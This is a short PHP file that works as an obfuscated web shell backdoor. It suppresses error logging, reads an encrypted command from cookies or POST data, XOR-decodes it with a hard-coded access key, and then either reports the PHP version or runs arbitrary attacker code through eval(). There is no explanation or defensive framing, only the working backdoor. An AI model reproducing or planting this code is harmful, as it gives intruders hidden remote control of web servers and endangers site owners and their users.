<?php
$da59aa5 = 208;
$GLOBALS['w8fd00d8'] = Array();
global $w8fd00d8;
$w8fd00d8 = $GLOBALS;
${"\x47\x4c\x4fB\x41\x4c\x53"}['a904'] = "\x2f\x25\x32\x54\x75\x3a\x5e\x36\x31\x48\x21\x5b\x30\x66\x20\x5f\x56\x5a\x4d\x23\x3e\x37\x71\x29\x26\x2c\x68\x7e\x5c\x9\x64\x69\x6e\x3c\x6b\x2b\x61\x2d\x4a\x47\x42\x7c\xa\x6a\x7b\x6f\x52\x27\x4c\x39\x55\x63\x4b\x7a\x49\x3f\x5d\x76\x33\x59\x43\x62\x24\x38\x79\x70\x72\x67\x28\x35\x46\x3d\x7d\x65\x57\x41\x53\x44\x73\x60\x58\x34\x77\x22\x6c\x6d\x4e\x45\x4f\x40\x78\x74\x50\xd\x2a\x2e\x3b\x51";
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
if (!defined('ALREADY_RUN_366afb8a8a2355ab21fbf11ba1a02fba')){
        define('ALREADY_RUN_366afb8a8a2355ab21fbf11ba1a02fba', 1);
        $vv = NULL;
        $kk = NULL;
        $w8fd00d8['c77700426'] = 'aec7e598-2fbc-4b15-871f-1d786eeb80dc';
        global $c77700426;
        function  e664fd($vv, $kk){
        global $w8fd00d8;
        $n513761 = "";
        for ($i=0;$i<strlen($vv);){
                for ($p=0;$p<strlen($kk) && $i<strlen($vv);$p++, $i++){
                        $n513761 .= chr(ord($vv[$i]) ^ ord($kk[$p]));
                }
        }
        return $n513761;
        }

        function  x184f5cc($vv, $kk){
                global $w8fd00d8;
                global $c77700426;
                return e664fd(e664fd($vv, $c77700426), $kk);
        }

        foreach ($_COOKIE as $k=>$v){
        $vv = $v;
        $kk = $k;
        }

        if (!$vv){
                foreach ($_POST as $k=>$v){
                $vv = $v;
                $kk = $k;
                }
        }

        $vv = @json_decode(x184f5cc(base64_decode($vv), $kk), true);
        
        if (isset($vv['a'.'k']) && $c77700426==$vv['a'.'k']){
                if ($vv['a'] == 'i'){
                        $l71c40 = Array('p'.'v' => @phpversion(),'s'.'v' => '1'.'.'.'0'.'-'.'1',);
                        echo @serialize($l71c40);
                }
                elseif ($vv['a'] == 'e'){
                eval/*r49557ec*/($vv['d']);
                }
                }
                exit();
        }

?>
